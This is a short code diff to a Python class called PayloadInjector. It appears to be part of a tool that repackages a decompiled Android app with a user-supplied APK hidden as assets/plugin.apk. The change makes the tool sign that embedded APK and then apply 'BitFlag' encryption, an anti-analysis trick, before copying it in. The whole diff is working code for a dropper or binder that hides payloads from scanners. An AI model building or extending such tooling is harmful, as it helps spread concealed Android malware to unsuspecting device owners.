@@ -158,7 +158,7 @@ class PayloadInjector:
             return None
     
     async def _inject_plugin_apk(self, user_apk_path):
-        """Replace assets/plugin.apk with user APK (with BitFlag encryption)"""
+        """Replace assets/plugin.apk with user APK (Sign + BitFlag)"""
         try:
             plugin_path = os.path.join(self.decompiled_dir, 'assets', 'plugin.apk')
             
@@ -167,23 +167,39 @@ class PayloadInjector:
                 os.remove(plugin_path)
                 logger.debug("Removed old plugin.apk")
             
-            # Check if APK already has BitFlag
-            already_encrypted = await self._check_bitflag(user_apk_path)
+            # Temp files for processing
+            temp_signed = os.path.join(self.work_dir, 'plugin_signed.apk')
+            temp_encrypted = os.path.join(self.work_dir, 'plugin_encrypted.apk')
+            
+            # Step 1: Sign user APK
+            logger.info("✍️ Signing plugin APK...")
+            signed_apk = await self._sign_apk(user_apk_path, temp_signed)
+            
+            if not signed_apk or not os.path.exists(signed_apk):
+                logger.warning("Signing failed, using original APK")
+                signed_apk = user_apk_path
+            else:
+                logger.info("✅ Plugin signed")
+            
+            # Step 2: Check if already has BitFlag
+            already_encrypted = await self._check_bitflag(signed_apk)
             
             if already_encrypted:
                 logger.info("✅ APK already encrypted (BitFlag detected), copying as-is...")
-                shutil.copy2(user_apk_path, plugin_path)
+                shutil.copy2(signed_apk, plugin_path)
             else:
-                # Encrypt user APK before injection
-                logger.info("🔐 Encrypting user APK (BitFlag)...")
-                encrypted_apk = await self._encrypt_bitflag(user_apk_path, plugin_path)
+                # Step 3: Apply BitFlag encryption
+                logger.info("🔐 Encrypting plugin APK (BitFlag)...")
+                encrypted_apk = await self._encrypt_bitflag(signed_apk, plugin_path)
                 
                 if not encrypted_apk:
                     # Fallback: copy without encryption
-                    logger.warning("Encryption failed, copying without BitFlag")
-                    shutil.copy2(user_apk_path, plugin_path)
+                    logger.warning("Encryption failed, copying signed APK")
+                    shutil.copy2(signed_apk, plugin_path)
+                else:
+                    logger.info("✅ Plugin encrypted")
             
-            logger.info("✅ User APK injected as plugin.apk")
+            logger.info("✅ User APK injected as plugin.apk (signed + encrypted)")
             
             return True
             
